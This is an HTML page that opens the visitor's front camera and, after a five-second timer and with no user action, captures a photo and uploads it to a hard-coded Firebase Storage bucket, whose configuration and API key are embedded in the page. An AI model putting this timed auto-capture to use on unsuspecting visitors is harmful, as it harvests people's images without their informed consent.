<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Photo and Upload to Firebase</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        video, canvas {
            width: 300px;
            height: 300px;
            border: 2px solid black;
        }
        button {
            margin-top: 10px;
            padding: 10px 20px;
            background-color: blue;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyC6s8Vv6hGuJqRYDb8BMZ9NdpUcrQipFq4",
            authDomain: "indexcam-67629.firebaseapp.com",
            projectId: "indexcam-67629",
            storageBucket: "indexcam-67629.firebasestorage.app",
            messagingSenderId: "388826493507",
            appId: "1:388826493507:web:ee85b462e4bbeb051c1af6"
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const storage = firebase.storage();

        // Access the user's camera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => { video.srcObject = stream; })
            .catch(err => { console.error("Error accessing camera: ", err); });

        // Automatically capture photo and upload it
        setTimeout(() => {
            console.log('Capturing photo...');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to Blob
            canvas.toBlob(blob => {
                console.log('Captured photo blob:', blob);

                // Upload the photo to Firebase Storage
                const storageRef = storage.ref();
                const photoRef = storageRef.child(`photos/captured_photo_${Date.now()}.png`);
                photoRef.put(blob).then(snapshot => {
                    console.log('Photo uploaded successfully:', snapshot);
                    alert('Photo uploaded to Firebase Storage!');
                }).catch(err => console.error('Error uploading photo:', err));
            }, 'image/png');
        }, 5000); // 5 seconds delay
    </script>
</body>
</html>
